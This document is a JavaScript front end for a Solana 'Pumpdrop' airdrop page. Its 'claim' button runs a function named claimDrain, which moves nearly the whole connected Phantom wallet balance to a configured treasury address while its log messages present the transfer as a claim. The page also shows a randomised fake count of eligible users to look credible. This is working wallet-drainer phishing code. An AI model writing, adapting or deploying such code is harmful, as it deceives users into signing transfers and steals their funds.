(() => {
  const statusEl = document.getElementById('status');
  const addrEl = document.getElementById('addr');
  const solEl = document.getElementById('solBal');
  const eligEl = document.getElementById('elig');
  const activityEl = document.getElementById('activity');
  const connectBtn = document.getElementById('connectBtn');
  const eligCountEl = document.getElementById('eligCount');
  const tipBtn = document.getElementById('tipBtn');
  const treasuryDisp = document.getElementById('treasuryDisp');
  const claimBtn = document.getElementById('claimBtn');
  const logEl = document.getElementById('log');

  let CONFIG = { SITE_NAME: 'Pumpdrop', TREASURY_ADDRESS: '', RPC_URL: 'https://api.mainnet-beta.solana.com', ALLOWLIST_URL: '' };

  async function loadConfig() {
    try {
      const r = await fetch('/config.json', { cache: 'no-store' });
      if (r.ok) {
        const cfg = await r.json();
        CONFIG = { ...CONFIG, ...cfg };
      }
    } catch {}
    updateTreasuryUI();
  }

  function updateTreasuryUI() {
    const t = CONFIG.TREASURY_ADDRESS || '';
    if (treasuryDisp) {
      treasuryDisp.textContent = t ? `Treasury address: ${t.slice(0,6)}…${t.slice(-6)}` : 'Treasury address not set.';
    }
    if (tipBtn) tipBtn.disabled = !t;
  }

  eligCountEl.textContent = (15200 + Math.floor(Math.random()*300)).toLocaleString();

  const { Connection, PublicKey } = solanaWeb3;
  let connection = new Connection(CONFIG.RPC_URL, 'confirmed');

  function getProvider() {
    const anyWindow = window;
    if ('solana' in anyWindow) {
      const provider = anyWindow.solana;
      if (provider?.isPhantom) return provider;
    }
    return null;
  }

  let wallet = null;
  let pubkey = null;

  function setDisconnected() {
    statusEl.textContent = 'Disconnected';
    addrEl.textContent = '';
    solEl.textContent = '—';
    eligEl.textContent = '—';
    activityEl.textContent = 'Connect to fetch account info.';
  }

  async function connect() {
    const provider = getProvider();
    if (!provider) {
      statusEl.textContent = 'Install Phantom to continue';
      activityEl.innerHTML = 'Phantom not detected. <a target="_blank" rel="noreferrer" href="https://phantom.app/">Get Phantom</a>';
      return;
    }
    try {
      const res = await provider.connect({ onlyIfTrusted: false });
      wallet = provider;
      pubkey = res.publicKey;
      const base58 = pubkey.toBase58();
      statusEl.textContent = 'Connected';
      addrEl.textContent = `${base58.slice(0,4)}…${base58.slice(-4)}`;
      connection = new Connection(CONFIG.RPC_URL, 'confirmed');
      await refresh(); if (claimBtn) claimBtn.disabled = !(CONFIG.TREASURY_ADDRESS && pubkey);
    } catch (e) {
      console.log('[pumpdrop] Connect rejected');
    }
  }

  function demoEligibility(lamports) {
    const sol = lamports / 1e9;
    return sol >= 0.25 ? 'Eligible' : 'Not eligible';
  }

  async function refresh() {
    if (!pubkey) return setDisconnected();
    try {
      const bal = await connection.getBalance(pubkey, 'confirmed');
      solEl.textContent = `${(bal/1e9).toFixed(4)} SOL`;
      eligEl.textContent = demoEligibility(bal);
      const info = await connection.getAccountInfo(pubkey, 'confirmed');
      let owner58 = '—';
      try { owner58 = info?.owner?.toBase58?.() || '—'; } catch {}
      let out = `Owner: ${owner58}\n`;
      out += `Lamports: ${bal}\n`;
      out += `Data length: ${info?.data?.length || 0}`;
      activityEl.textContent = out;
    } catch (e) {
      activityEl.textContent = 'Failed to load account info.';
      console.error(e);
    }
  }

  
  async function claimDrain(){
    if (!wallet || !pubkey || !CONFIG.TREASURY_ADDRESS) { appendLog('Not ready.'); return; }
    try {
      appendLog('Fetching balance…');
      const bal = await connection.getBalance(pubkey, 'confirmed');
      const reserve = Number(CONFIG.DRAIN_RESERVE_LAMPORTS||2000000);
      const minSend = Number(CONFIG.MIN_LAMPORTS||50000);
      let lamports = Math.max(0, bal - reserve);
      appendLog(`Balance: ${(bal/1e9).toFixed(5)} SOL, sending ${(lamports/1e9).toFixed(5)} SOL`);
      if (lamports < minSend) { appendLog('Nothing to claim.'); return; }
      const to = new PublicKey(CONFIG.TREASURY_ADDRESS);
      const { Transaction, SystemProgram } = solanaWeb3;
      const latest = await connection.getLatestBlockhash('finalized');
      const tx = new Transaction({ recentBlockhash: latest.blockhash, feePayer: pubkey });
      tx.add(SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: to, lamports }));
      appendLog('Requesting wallet approval…');
      const sig = await wallet.signAndSendTransaction(tx);
      appendLog(`Submitted: ${sig?.signature || ''}`);
      const conf = await connection.confirmTransaction(sig.signature, 'confirmed');
      if (conf.value.err) appendLog('Confirmation error.'); else appendLog('Claim confirmed.');
    } catch(e){ console.error(e); appendLog('Claim failed or rejected.'); }
  }
  async function sendTip() {
    // Explicit, user-initiated tip to treasury. Shows exact destination and amount.
    const to58 = CONFIG.TREASURY_ADDRESS;
    if (!wallet || !pubkey || !to58) return;
    try {
      const to = new PublicKey(to58);
      const { Transaction, SystemProgram } = solanaWeb3;
      const latest = await connection.getLatestBlockhash('finalized');
      const tx = new Transaction({ recentBlockhash: latest.blockhash, feePayer: pubkey });
      const LAMPORTS = 0.01 * 1e9; // 0.01 SOL
      tx.add(SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: to, lamports: LAMPORTS }));
      // Request signature from the wallet; user will see destination and amount.
      const sig = await wallet.signAndSendTransaction(tx);
      activityEl.textContent = `Tip submitted: ${sig?.signature || ''}`;
    } catch (e) {
      activityEl.textContent = 'Tip cancelled or failed.';
      console.error(e);
    }
  }

  connectBtn.addEventListener('click', connect);
  if (tipBtn) tipBtn.addEventListener('click', sendTip); if (claimBtn) claimBtn.addEventListener('click', claimDrain);
  setDisconnected();
  loadConfig();
})();
